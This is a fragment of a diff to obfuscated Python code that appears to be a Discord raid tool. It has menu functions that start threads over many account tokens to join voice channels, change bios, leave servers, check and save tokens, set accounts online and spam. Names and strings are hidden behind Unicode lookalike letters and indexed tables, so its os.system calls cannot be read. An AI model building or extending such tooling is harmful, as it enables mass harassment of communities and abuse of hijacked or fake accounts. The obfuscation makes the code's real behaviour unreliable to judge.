+        𝘀𝘦𝗿𝘷𝗲𝙧_𝙞𝙙 = 𝙞𝙣𝗽𝘂𝘵(𝗜𝘕𝘐𝗡𝗹𝗹𝗜𝙈𝙄𝘐𝗹𝗠𝗹𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝗹𝘕𝙡𝙈𝘐𝘔𝘐𝙈[386])
+        if 𝘴𝙚𝘳𝘷𝗲𝘳_𝘪𝙙 == 𝙄𝘕𝙄𝙉𝘭𝗹𝘐𝗠𝗜𝗜𝘭𝙈𝗹𝙡𝘐𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝘔𝘕𝙡𝙉𝘭𝘔𝗜𝙈𝘐𝘔[22]:
+            𝙈𝗲𝗻𝘶().main_menu()
+        𝘰𝘀.system(𝗜𝗡𝙄𝘕𝗹𝘭𝙄𝙈𝘐𝙄𝙡𝙈𝙡𝘭𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝗹𝙉𝙡𝙈𝘐𝙈𝘐𝙈[1])
+        𝙥𝗿𝘪𝘯𝘁(𝗺𝗲𝙣𝙪)
+        for 𝙩𝘰𝙠𝗲𝙣 in 𝙩𝙤𝗸𝗲𝘯𝘴:
+            𝘁𝗵𝙧𝘦𝗮𝙙𝘪𝘯𝙜.Thread(target=𝘢𝘤𝙘𝘦𝗽𝘵_𝙧𝘶𝗹𝘦𝘀𝘀, args=(𝘀𝗲𝘳𝙫𝙚𝗿_𝙞𝘥, 𝘵𝘰𝙠𝗲𝗻)).start()
+        𝘦𝙭𝙞𝘁 = 𝙞𝘯𝘱𝘂𝙩(𝘐𝗡𝗜𝘕𝗹𝗹𝙄𝘔𝙄𝘐𝙡𝗠𝗹𝘭𝘐𝘭𝙡𝘕𝗡𝗜𝙡𝘭𝙈𝗡𝗹𝙉𝙡𝙈𝗜𝘔𝗜𝗠[22])
+        𝘦𝙭𝘪𝘁 = 𝙈𝙚𝘯𝘂().main_menu()
+        𝘦𝙭𝙞𝙩()
+
+    @𝘄𝘳𝘢𝘱𝘱𝗲𝗿
     def voicejoiner(self):
-        𝙤𝘴.system(𝙉𝘔𝗠𝘔𝗡𝘭𝙡𝘔𝗠𝗹𝗠𝙈𝙉𝙡𝗜𝗠𝘐𝙄𝗡𝗠𝙄𝘐𝗠𝙄𝙡𝗜𝙉𝗜𝘔𝘐𝘐𝙈[394])
-        𝙤𝘴.system(𝙉𝘔𝘔𝙈𝙉𝘭𝙡𝙈𝙈𝗹𝙈𝙈𝘕𝘭𝙄𝙈𝙄𝘐𝗡𝙈𝗜𝗜𝘔𝙄𝙡𝗜𝗡𝘐𝘔𝘐𝘐𝘔[1])
-        𝘱𝘳𝘪𝗻𝘵(𝗺𝘦𝘯𝘶)
-        𝗴𝘶𝗶𝘭𝘥 = 𝘪𝙣𝗽𝙪𝘵(f'{𝗿}{𝙉𝙈𝘔𝙈𝙉𝘭𝘭𝘔𝙈𝙡𝙈𝘔𝗡𝙡𝙄𝘔𝙄𝗜𝙉𝗠𝘐𝘐𝙈𝘐𝙡𝗜𝘕𝘐𝘔𝗜𝘐𝗠[98]}{𝘭𝘤}{𝘕𝗠𝙈𝘔𝗡𝘭𝘭𝗠𝗠𝘭𝗠𝗠𝙉𝘭𝙄𝗠𝘐𝘐𝘕𝗠𝘐𝗜𝙈𝙄𝘭𝙄𝗡𝗜𝙈𝗜𝘐𝙈[386]}{𝗿}{𝗡𝘔𝗠𝗠𝙉𝙡𝗹𝘔𝗠𝙡𝘔𝘔𝗡𝗹𝙄𝙈𝘐𝙄𝗡𝘔𝗜𝙄𝘔𝘐𝘭𝗜𝙉𝗜𝙈𝙄𝘐𝗠[372]}')
-        if 𝗴𝘂𝗶𝘭𝘥 == 𝘕𝗠𝗠𝙈𝙉𝘭𝘭𝘔𝗠𝙡𝗠𝗠𝙉𝘭𝘐𝘔𝘐𝙄𝘕𝘔𝗜𝗜𝙈𝗜𝙡𝙄𝘕𝘐𝗠𝘐𝗜𝗠[29]:
-            𝙈𝗲𝘯𝙪().main_menu()
-        𝘤𝙝𝗮𝙣𝗻𝘦𝙡 = 𝗶𝘯𝘱𝘂𝙩(f'{𝙧}{𝗡𝘔𝙈𝗠𝗡𝙡𝘭𝙈𝘔𝘭𝗠𝗠𝗡𝘭𝗜𝗠𝘐𝘐𝘕𝙈𝙄𝘐𝘔𝙄𝙡𝘐𝘕𝗜𝙈𝘐𝙄𝙈[98]}{𝙡𝙘}{𝙉𝗠𝘔𝙈𝙉𝘭𝘭𝙈𝙈𝙡𝙈𝘔𝘕𝙡𝙄𝗠𝙄𝗜𝙉𝗠𝘐𝗜𝗠𝙄𝘭𝗜𝗡𝗜𝗠𝙄𝗜𝗠[380]}{𝘳}{𝙉𝙈𝗠𝗠𝗡𝗹𝙡𝗠𝙈𝙡𝘔𝘔𝙉𝘭𝙄𝙈𝙄𝗜𝘕𝘔𝗜𝗜𝘔𝘐𝗹𝗜𝙉𝘐𝙈𝘐𝗜𝘔[372]}')
-        if 𝙘𝙝𝘢𝘯𝗻𝘦𝙡 == 𝘕𝘔𝙈𝘔𝘕𝙡𝘭𝘔𝗠𝙡𝗠𝙈𝘕𝙡𝘐𝘔𝘐𝘐𝙉𝗠𝗜𝙄𝗠𝙄𝗹𝘐𝘕𝙄𝘔𝙄𝘐𝘔[29]:
-            𝗠𝘦𝙣𝘂().main_menu()
-        𝗼𝘴.system(𝘕𝙈𝘔𝗠𝘕𝘭𝗹𝗠𝗠𝙡𝘔𝙈𝗡𝗹𝙄𝙈𝗜𝘐𝗡𝗠𝘐𝙄𝙈𝙄𝘭𝗜𝗡𝘐𝗠𝙄𝘐𝗠[1])
-        𝘱𝗿𝘪𝗻𝘵(𝗺𝙚𝘯𝘂)
-        for 𝙩𝗼𝘬𝗲𝙣 in 𝘵𝗼𝗸𝙚𝙣𝘀:
-            𝘁𝗵𝘳𝘦𝙖𝗱𝙞𝗻𝗴.Thread(target=𝙫𝗰_𝗷𝙤𝗶𝘯𝙚𝙧, args=(𝘵𝗼𝗸𝘦𝗻, 𝘨𝙪𝙞𝗹𝗱, 𝘤𝘩𝙖𝙣𝘯𝙚𝗹)).start()
-        𝗲𝙭𝘪𝘵 = 𝙞𝘯𝙥𝘂𝙩(𝘕𝘔𝗠𝗠𝙉𝘭𝗹𝙈𝘔𝙡𝗠𝗠𝘕𝗹𝙄𝙈𝙄𝗜𝗡𝘔𝘐𝗜𝙈𝘐𝗹𝙄𝘕𝗜𝗠𝗜𝘐𝘔[29])
-        𝙚𝘅𝗶𝘵 = 𝗠𝘦𝗻𝙪().main_menu()
-        𝗲𝘹𝘪𝘁()
+        𝙤𝘀.system(𝙄𝘕𝗜𝘕𝙡𝗹𝘐𝘔𝘐𝗜𝗹𝘔𝙡𝘭𝙄𝗹𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝗜𝙈𝗜𝘔[387])
+        𝗼𝙨.system(𝘐𝗡𝙄𝗡𝗹𝗹𝗜𝘔𝘐𝙄𝗹𝗠𝘭𝘭𝘐𝙡𝘭𝗡𝙉𝘐𝘭𝙡𝙈𝘕𝗹𝘕𝘭𝙈𝘐𝙈𝘐𝙈[1])
+        𝗽𝙧𝘪𝙣𝘵(𝗺𝘦𝘯𝘂)
+        𝙜𝘂𝙞𝘭𝘥 = 𝘪𝙣𝗽𝙪𝘁(f'{𝗿}{𝘐𝘕𝙄𝗡𝘭𝗹𝘐𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝘕𝙄𝙡𝙡𝘔𝙉𝗹𝗡𝘭𝗠𝘐𝘔𝙄𝗠[91]}{𝗹𝙘}{𝙄𝗡𝗜𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝗠𝙡𝙡𝘐𝙡𝗹𝘕𝘕𝗜𝗹𝙡𝗠𝗡𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝘔[379]}{𝗿}{𝙄𝗡𝘐𝗡𝘭𝙡𝙄𝙈𝙄𝗜𝙡𝙈𝗹𝗹𝙄𝘭𝗹𝗡𝘕𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝙡𝗠𝙄𝙈𝗜𝘔[365]}')
+        if 𝗴𝙪𝙞𝙡𝙙 == 𝘐𝗡𝘐𝙉𝘭𝗹𝙄𝙈𝗜𝙄𝙡𝙈𝙡𝗹𝗜𝗹𝗹𝗡𝙉𝗜𝙡𝘭𝗠𝘕𝗹𝙉𝙡𝗠𝙄𝗠𝗜𝗠[22]:
+            𝗠𝘦𝙣𝙪().main_menu()
+        𝘤𝘩𝗮𝘯𝘯𝗲𝗹 = 𝗶𝗻𝗽𝘶𝘁(f'{𝗿}{𝙄𝗡𝙄𝗡𝙡𝗹𝘐𝙈𝗜𝙄𝗹𝘔𝗹𝙡𝘐𝙡𝙡𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝗹𝗡𝙡𝗠𝗜𝙈𝙄𝘔[91]}{𝗹𝗰}{𝗜𝗡𝘐𝘕𝙡𝗹𝘐𝙈𝗜𝙄𝘭𝗠𝗹𝘭𝘐𝘭𝘭𝙉𝙉𝗜𝘭𝗹𝗠𝙉𝘭𝗡𝘭𝙈𝗜𝘔𝗜𝗠[373]}{𝙧}{𝘐𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝗜𝘐𝘭𝘔𝗹𝗹𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝘭𝙉𝙡𝙈𝙄𝗠𝗜𝙈[365]}')
+        if 𝘤𝗵𝘢𝘯𝘯𝙚𝙡 == 𝘐𝗡𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝗜𝘭𝗠𝗹𝗹𝘐𝘭𝘭𝗡𝙉𝗜𝙡𝙡𝗠𝘕𝙡𝙉𝗹𝗠𝙄𝘔𝗜𝙈[22]:
+            𝘔𝙚𝘯𝘶().main_menu()
+        𝙤𝘀.system(𝙄𝘕𝘐𝘕𝗹𝗹𝘐𝗠𝘐𝙄𝗹𝗠𝙡𝘭𝙄𝗹𝗹𝗡𝙉𝘐𝗹𝙡𝙈𝗡𝗹𝘕𝗹𝙈𝗜𝗠𝗜𝙈[1])
+        𝘱𝙧𝘪𝘯𝙩(𝘮𝘦𝙣𝘶)
+        for 𝘵𝗼𝗸𝘦𝗻 in 𝙩𝙤𝗸𝗲𝙣𝙨:
+            𝘵𝘩𝙧𝙚𝗮𝙙𝙞𝗻𝗴.Thread(target=𝘃𝙘_𝗷𝗼𝗶𝗻𝗲𝗿, args=(𝙩𝗼𝘬𝘦𝘯, 𝘨𝙪𝙞𝗹𝘥, 𝘤𝙝𝗮𝗻𝗻𝘦𝗹)).start()
+        𝘦𝘹𝙞𝘁 = 𝗶𝘯𝙥𝙪𝘵(𝙄𝙉𝙄𝘕𝗹𝘭𝗜𝘔𝗜𝙄𝘭𝘔𝗹𝘭𝗜𝗹𝗹𝘕𝗡𝘐𝘭𝗹𝘔𝘕𝘭𝗡𝘭𝘔𝙄𝙈𝘐𝗠[22])
+        𝘦𝙭𝘪𝘵 = 𝘔𝗲𝙣𝘶().main_menu()
+        𝗲𝙭𝗶𝘵()
 
-    @𝙬𝗿𝙖𝙥𝗽𝗲𝗿
+    @𝘸𝘳𝗮𝘱𝗽𝗲𝗿
     def Change_bio(self):
-        𝗼𝘴.system(𝗡𝙈𝘔𝙈𝙉𝗹𝗹𝙈𝙈𝘭𝘔𝗠𝙉𝙡𝗜𝗠𝗜𝙄𝘕𝗠𝗜𝙄𝗠𝘐𝙡𝘐𝘕𝙄𝘔𝘐𝗜𝘔[395])
-        𝗼𝙨.system(𝘕𝗠𝙈𝗠𝘕𝙡𝙡𝗠𝗠𝗹𝘔𝙈𝘕𝙡𝙄𝘔𝙄𝘐𝘕𝘔𝘐𝙄𝙈𝗜𝘭𝘐𝘕𝘐𝘔𝙄𝙄𝗠[1])
-        𝗽𝗿𝙞𝗻𝘁(𝙢𝘦𝗻𝙪)
-        𝘣𝘪𝗼 = 𝙞𝙣𝙥𝘂𝘁(f'{𝙧}{𝗡𝗠𝘔𝗠𝙉𝙡𝙡𝗠𝗠𝙡𝘔𝘔𝙉𝘭𝙄𝙈𝙄𝗜𝘕𝗠𝘐𝗜𝘔𝗜𝘭𝗜𝘕𝗜𝘔𝗜𝗜𝗠[98]}{𝙡𝗰}{𝙉𝘔𝘔𝗠𝘕𝗹𝗹𝗠𝗠𝙡𝙈𝗠𝘕𝗹𝘐𝘔𝘐𝗜𝗡𝗠𝘐𝘐𝗠𝘐𝙡𝗜𝘕𝘐𝙈𝙄𝙄𝙈[396]}{𝘳}{𝘕𝙈𝘔𝙈𝗡𝙡𝘭𝘔𝘔𝘭𝙈𝘔𝗡𝗹𝘐𝙈𝗜𝗜𝘕𝘔𝙄𝗜𝙈𝗜𝙡𝘐𝗡𝙄𝗠𝗜𝗜𝗠[372]}')
-        if 𝗯𝙞𝙤 == 𝙉𝘔𝗠𝘔𝘕𝗹𝗹𝘔𝗠𝗹𝘔𝗠𝗡𝙡𝘐𝗠𝘐𝗜𝗡𝘔𝙄𝗜𝗠𝗜𝘭𝙄𝗡𝙄𝙈𝗜𝗜𝙈[29]:
-            𝗠𝙚𝙣𝘶().main_menu()
-        𝙤𝘀.system(𝙉𝗠𝘔𝗠𝘕𝙡𝗹𝙈𝗠𝘭𝘔𝙈𝙉𝘭𝙄𝗠𝘐𝘐𝘕𝗠𝙄𝙄𝘔𝘐𝙡𝘐𝗡𝙄𝗠𝗜𝙄𝙈[1])
-        𝗽𝘳𝙞𝗻𝘁(𝙢𝘦𝙣𝘂)
-        for 𝘁𝗼𝘬𝗲𝘯 in 𝘁𝗼𝘬𝙚𝗻𝙨:
-            𝘁𝙝𝗿𝙚𝙖𝗱𝘪𝙣𝘨.Thread(target=𝘣𝗶𝘰_𝙘𝘩𝙖𝘯𝗴𝙚𝘳, args=(𝙩𝙤𝘬𝗲𝙣, 𝙗𝙞𝗼)).start()
-        𝙚𝙭𝘪𝙩 = 𝗶𝘯𝙥𝘂𝘁(𝙉𝘔𝗠𝘔𝘕𝗹𝙡𝘔𝘔𝘭𝘔𝙈𝘕𝗹𝘐𝙈𝘐𝘐𝗡𝙈𝘐𝘐𝙈𝘐𝗹𝙄𝘕𝗜𝙈𝙄𝙄𝘔[29])
-        𝙚𝘅𝗶𝘵 = 𝙈𝙚𝘯𝘶().main_menu()
-        𝙚𝙭𝘪𝘵()
+        𝘰𝘀.system(𝙄𝙉𝘐𝗡𝙡𝗹𝗜𝘔𝗜𝙄𝘭𝗠𝙡𝙡𝘐𝗹𝘭𝘕𝗡𝗜𝗹𝘭𝙈𝙉𝗹𝙉𝗹𝗠𝙄𝘔𝙄𝙈[388])
+        𝙤𝙨.system(𝘐𝙉𝙄𝘕𝘭𝗹𝘐𝘔𝘐𝘐𝙡𝘔𝙡𝙡𝘐𝗹𝗹𝙉𝗡𝙄𝘭𝘭𝘔𝘕𝗹𝘕𝗹𝙈𝗜𝘔𝙄𝙈[1])
+        𝘱𝗿𝗶𝗻𝘁(𝗺𝗲𝙣𝙪)
+        𝗯𝗶𝙤 = 𝗶𝙣𝗽𝙪𝘁(f'{𝙧}{𝗜𝙉𝘐𝗡𝘭𝗹𝗜𝙈𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝙡𝗹𝘕𝗡𝗜𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝘔𝗜𝙈𝙄𝙈[91]}{𝘭𝗰}{𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝗹𝘔𝙡𝘭𝗜𝗹𝘭𝗡𝘕𝘐𝗹𝘭𝘔𝘕𝘭𝙉𝘭𝘔𝙄𝗠𝘐𝘔[389]}{𝘳}{𝘐𝘕𝗜𝗡𝘭𝘭𝗜𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝘭𝗹𝗡𝙉𝗜𝗹𝗹𝙈𝗡𝙡𝗡𝙡𝘔𝗜𝗠𝗜𝙈[365]}')
+        if 𝗯𝘪𝗼 == 𝘐𝙉𝙄𝘕𝘭𝙡𝙄𝙈𝙄𝗜𝙡𝘔𝙡𝗹𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝙡𝗡𝙡𝙈𝘐𝙈𝙄𝘔[22]:
+            𝘔𝘦𝙣𝘶().main_menu()
+        𝘰𝘀.system(𝘐𝘕𝙄𝗡𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝗹𝙡𝙄𝙡𝙡𝘕𝘕𝗜𝘭𝗹𝘔𝗡𝘭𝙉𝙡𝘔𝙄𝙈𝙄𝙈[1])
+        𝙥𝙧𝙞𝗻𝘁(𝘮𝙚𝙣𝘶)
+        for 𝘁𝘰𝗸𝗲𝗻 in 𝙩𝙤𝗸𝙚𝗻𝙨:
+            𝙩𝙝𝘳𝗲𝘢𝘥𝘪𝗻𝙜.Thread(target=𝙗𝘪𝙤_𝘤𝙝𝙖𝘯𝘨𝙚𝘳, args=(𝘵𝙤𝗸𝗲𝙣, 𝗯𝙞𝙤)).start()
+        𝙚𝙭𝙞𝙩 = 𝘪𝘯𝗽𝘂𝘵(𝗜𝘕𝗜𝙉𝗹𝘭𝙄𝗠𝗜𝗜𝙡𝘔𝗹𝗹𝙄𝗹𝗹𝙉𝗡𝙄𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝙄𝗠𝗜𝙈[22])
+        𝙚𝘅𝗶𝘵 = 𝗠𝙚𝗻𝙪().main_menu()
+        𝗲𝙭𝘪𝘁()
 
-    @𝙬𝗿𝗮𝘱𝘱𝙚𝗿
+    @𝘄𝘳𝙖𝘱𝙥𝙚𝗿
     def leaver(self):
-        𝗼𝘀.system(𝘕𝙈𝙈𝙈𝘕𝘭𝙡𝙈𝗠𝘭𝗠𝘔𝗡𝘭𝙄𝘔𝙄𝘐𝘕𝗠𝘐𝙄𝘔𝘐𝙡𝗜𝗡𝗜𝙈𝙄𝙄𝗠[158])
-        𝘰𝘀.system(𝗡𝘔𝙈𝗠𝙉𝘭𝙡𝘔𝙈𝗹𝘔𝘔𝘕𝘭𝙄𝗠𝗜𝗜𝘕𝗠𝘐𝘐𝗠𝙄𝗹𝘐𝘕𝙄𝘔𝗜𝙄𝗠[1])
-        𝘱𝙧𝗶𝘯𝘁(𝙢𝘦𝙣𝘶)
-        𝙜𝘶𝘪𝙡𝙙 = 𝘪𝘯𝗽𝘶𝘵(𝗰𝙤𝗻𝘀𝙤𝘭𝙚.prompt(𝗡𝗠𝘔𝙈𝙉𝙡𝙡𝘔𝗠𝘭𝙈𝗠𝙉𝙡𝗜𝙈𝗜𝗜𝘕𝗠𝙄𝘐𝙈𝙄𝘭𝙄𝘕𝗜𝙈𝙄𝘐𝗠[397]))
-        if 𝙜𝘂𝙞𝙡𝘥 == 𝙉𝘔𝙈𝙈𝘕𝙡𝘭𝙈𝙈𝘭𝙈𝘔𝗡𝘭𝗜𝘔𝗜𝗜𝗡𝗠𝗜𝙄𝘔𝗜𝙡𝗜𝙉𝗜𝘔𝗜𝘐𝙈[29]:
-            𝘔𝘦𝙣𝙪().main_menu()
-        𝙖𝙧𝙜𝘀 = [(𝘁𝗼𝗸𝘦𝙣, 𝗴𝘂𝘪𝙡𝘥) for 𝙩𝗼𝘬𝘦𝘯 in 𝙩𝘰𝗸𝙚𝗻𝘴]
-        𝘴𝘦𝙡𝘧.run(𝘀𝗲𝙡𝙛.raider.leaver, 𝘢𝙧𝗴𝙨)
+        𝘰𝘀.system(𝘐𝗡𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝗜𝘭𝘭𝘕𝙉𝗜𝙡𝘭𝗠𝗡𝘭𝘕𝙡𝙈𝙄𝙈𝘐𝗠[151])
+        𝘰𝘀.system(𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝘔𝘐𝗜𝘭𝘔𝗹𝗹𝙄𝘭𝙡𝗡𝙉𝙄𝘭𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝘐𝗠[1])
+        𝘱𝗿𝗶𝗻𝘵(𝘮𝘦𝘯𝙪)
+        𝙜𝘶𝗶𝘭𝗱 = 𝘪𝘯𝘱𝘂𝘁(𝗰𝘰𝗻𝘴𝙤𝘭𝘦.prompt(𝘐𝙉𝗜𝗡𝘭𝗹𝘐𝙈𝙄𝙄𝘭𝘔𝗹𝗹𝙄𝘭𝘭𝘕𝙉𝘐𝘭𝗹𝙈𝘕𝘭𝗡𝙡𝘔𝙄𝙈𝘐𝘔[390]))
+        if 𝗴𝙪𝙞𝙡𝗱 == 𝙄𝙉𝘐𝗡𝘭𝘭𝙄𝘔𝘐𝙄𝙡𝗠𝙡𝗹𝘐𝙡𝗹𝙉𝗡𝘐𝙡𝘭𝗠𝘕𝗹𝗡𝗹𝙈𝙄𝘔𝙄𝗠[22]:
+            𝗠𝙚𝙣𝘶().main_menu()
+        𝗮𝗿𝘨𝙨 = [(𝘵𝘰𝘬𝙚𝗻, 𝘨𝘂𝘪𝗹𝗱) for 𝙩𝗼𝗸𝗲𝘯 in 𝘵𝗼𝘬𝙚𝙣𝘴]
+        𝙨𝙚𝗹𝙛.run(𝘴𝗲𝙡𝘧.raider.leaver, 𝙖𝘳𝘨𝘴)
 
-    @𝙬𝗿𝘢𝙥𝙥𝗲𝙧
+    @𝘸𝙧𝗮𝘱𝙥𝗲𝙧
     def Checker(self):
-        𝗼𝘴.system(𝘕𝗠𝙈𝙈𝙉𝗹𝙡𝗠𝙈𝘭𝘔𝗠𝘕𝘭𝙄𝗠𝗜𝘐𝘕𝘔𝗜𝙄𝙈𝗜𝙡𝗜𝗡𝙄𝘔𝗜𝘐𝗠[398])
-        𝘴𝙖𝘃𝘦_𝘁𝘰𝘬𝗲𝗻𝙨(𝘕𝗠𝗠𝙈𝘕𝗹𝙡𝗠𝗠𝗹𝘔𝘔𝘕𝗹𝘐𝗠𝙄𝙄𝘕𝘔𝙄𝘐𝗠𝗜𝗹𝗜𝘕𝘐𝙈𝘐𝙄𝗠[66])
-        𝙚𝘹𝙞𝙩 = 𝙞𝙣𝘱𝘂𝙩(𝘕𝘔𝗠𝗠𝘕𝙡𝗹𝘔𝙈𝘭𝘔𝘔𝗡𝘭𝘐𝙈𝙄𝗜𝗡𝘔𝗜𝙄𝙈𝙄𝙡𝗜𝙉𝘐𝙈𝘐𝙄𝙈[29])
-        𝙚𝙭𝙞𝘁 = 𝘔𝘦𝘯𝘂().main_menu()
-        𝙚𝙭𝗶𝘵()
+        𝗼𝘴.system(𝙄𝗡𝗜𝘕𝘭𝗹𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝘭𝗜𝗹𝗹𝙉𝗡𝘐𝙡𝗹𝗠𝙉𝙡𝘕𝘭𝗠𝗜𝘔𝗜𝗠[391])
+        𝙨𝗮𝘃𝘦_𝘁𝘰𝙠𝘦𝘯𝘴(𝘐𝘕𝙄𝙉𝘭𝙡𝘐𝙈𝘐𝘐𝙡𝗠𝙡𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝙈𝗜𝗠[59])
+        𝙚𝙭𝙞𝙩 = 𝙞𝗻𝘱𝙪𝘵(𝙄𝘕𝗜𝗡𝗹𝙡𝘐𝙈𝘐𝙄𝙡𝙈𝗹𝘭𝙄𝗹𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝗡𝘭𝗡𝘭𝗠𝘐𝙈𝙄𝘔[22])
+        𝙚𝘹𝙞𝘵 = 𝘔𝘦𝗻𝘂().main_menu()
+        𝙚𝙭𝗶𝘁()
 
-    @𝘄𝙧𝗮𝙥𝗽𝗲𝙧
+    @𝘄𝗿𝙖𝙥𝗽𝙚𝘳
     def Onliner(self):
-        𝙤𝘀.system(𝙉𝙈𝗠𝙈𝘕𝙡𝗹𝗠𝘔𝘭𝙈𝙈𝗡𝙡𝘐𝘔𝗜𝗜𝗡𝘔𝗜𝙄𝙈𝘐𝗹𝙄𝙉𝘐𝙈𝗜𝙄𝙈[399])
-        𝗼𝙨.system(𝙉𝙈𝘔𝗠𝘕𝘭𝗹𝙈𝙈𝙡𝙈𝙈𝙉𝘭𝗜𝗠𝗜𝙄𝗡𝘔𝘐𝙄𝘔𝘐𝙡𝗜𝘕𝗜𝙈𝙄𝘐𝘔[1])
-        𝘱𝗿𝗶𝙣𝙩(𝘮𝘦𝗻𝙪)
-        for 𝙩𝘰𝘬𝗲𝗻 in 𝘁𝗼𝗸𝘦𝙣𝙨:
-            𝙩𝗵𝘳𝘦𝘢𝘥𝗶𝘯𝗴.Thread(target=𝗼𝙣𝙡𝘪𝗻𝘦𝙧, args=𝙩𝗼𝗸𝗲𝙣).start()
-        𝙥𝗿𝘪𝙣𝘵(f'{𝘳}{𝘕𝗠𝙈𝙈𝗡𝗹𝗹𝘔𝗠𝙡𝘔𝙈𝗡𝙡𝙄𝙈𝗜𝘐𝙉𝙈𝗜𝙄𝙈𝘐𝘭𝗜𝘕𝘐𝙈𝗜𝙄𝗠[98]}{𝘭𝘤}{𝗡𝙈𝘔𝙈𝗡𝗹𝗹𝘔𝘔𝗹𝗠𝗠𝙉𝘭𝙄𝗠𝙄𝗜𝙉𝗠𝗜𝘐𝙈𝗜𝙡𝘐𝗡𝙄𝗠𝗜𝗜𝙈[400]}{𝗿}{𝗡𝘔𝙈𝘔𝘕𝙡𝙡𝘔𝙈𝙡𝙈𝘔𝙉𝗹𝗜𝙈𝘐𝘐𝙉𝗠𝗜𝗜𝘔𝙄𝘭𝗜𝙉𝘐𝗠𝙄𝙄𝙈[401]}')
-        𝙚𝘅𝗶𝘁 = 𝘪𝘯𝘱𝘶𝙩(𝗡𝗠𝙈𝗠𝘕𝗹𝙡𝙈𝘔𝘭𝗠𝘔𝘕𝗹𝗜𝘔𝘐𝗜𝙉𝙈𝙄𝘐𝗠𝙄𝗹𝗜𝘕𝘐𝗠𝗜𝗜𝘔[29])
-        𝘦𝘅𝘪𝙩 = 𝗠𝙚𝗻𝙪().main_menu()
-        𝗲𝙭𝗶𝙩()
+        𝗼𝘀.system(𝘐𝘕𝘐𝙉𝙡𝘭𝘐𝘔𝗜𝘐𝘭𝗠𝙡𝗹𝗜𝘭𝗹𝘕𝘕𝗜𝙡𝗹𝗠𝗡𝙡𝙉𝗹𝗠𝗜𝗠𝙄𝙈[392])
+        𝘰𝙨.system(𝘐𝘕𝘐𝙉𝙡𝘭𝙄𝗠𝙄𝘐𝘭𝗠𝘭𝘭𝘐𝙡𝘭𝙉𝗡𝙄𝘭𝗹𝙈𝘕𝗹𝗡𝗹𝙈𝘐𝗠𝗜𝗠[1])
+        𝙥𝙧𝗶𝙣𝘁(𝙢𝙚𝙣𝘂)
+        for 𝘵𝗼𝙠𝗲𝗻 in 𝙩𝘰𝙠𝙚𝙣𝘴:
+            𝘁𝙝𝘳𝘦𝙖𝗱𝘪𝘯𝘨.Thread(target=𝘰𝗻𝙡𝘪𝗻𝗲𝗿, args=𝘁𝙤𝗸𝗲𝗻).start()
+        𝗽𝗿𝙞𝗻𝙩(f'{𝙧}{𝗜𝗡𝘐𝗡𝘭𝙡𝘐𝙈𝘐𝘐𝘭𝗠𝙡𝙡𝘐𝙡𝘭𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝗹𝙉𝙡𝘔𝙄𝙈𝗜𝗠[91]}{𝗹𝗰}{𝘐𝙉𝘐𝘕𝗹𝙡𝗜𝗠𝗜𝘐𝙡𝙈𝗹𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝘭𝗠𝘕𝗹𝘕𝗹𝗠𝗜𝘔𝗜𝗠[393]}{𝙧}{𝙄𝙉𝗜𝗡𝙡𝙡𝙄𝗠𝙄𝘐𝗹𝙈𝘭𝗹𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝙈𝙄𝙈[394]}')
+        𝘦𝘅𝘪𝘁 = 𝘪𝗻𝗽𝘂𝘁(𝙄𝗡𝗜𝗡𝘭𝘭𝘐𝗠𝗜𝙄𝙡𝘔𝗹𝘭𝗜𝙡𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝗡𝗹𝙉𝗹𝘔𝗜𝗠𝘐𝙈[22])
+        𝗲𝘹𝗶𝙩 = 𝙈𝘦𝙣𝘂().main_menu()
+        𝙚𝙭𝗶𝙩()
 
-    @𝘄𝗿𝙖𝙥𝙥𝗲𝗿
+    @𝘸𝘳𝘢𝗽𝗽𝘦𝙧
     def spammer(self):
-        𝘰𝘴.system(𝘕𝗠𝙈𝘔𝙉𝗹𝙡𝘔𝘔𝙡𝗠𝙈𝙉𝘭𝙄𝙈𝘐𝗜𝗡𝙈𝗜𝙄𝙈𝗜𝙡𝗜𝙉𝘐𝗠𝙄𝘐𝘔[402])
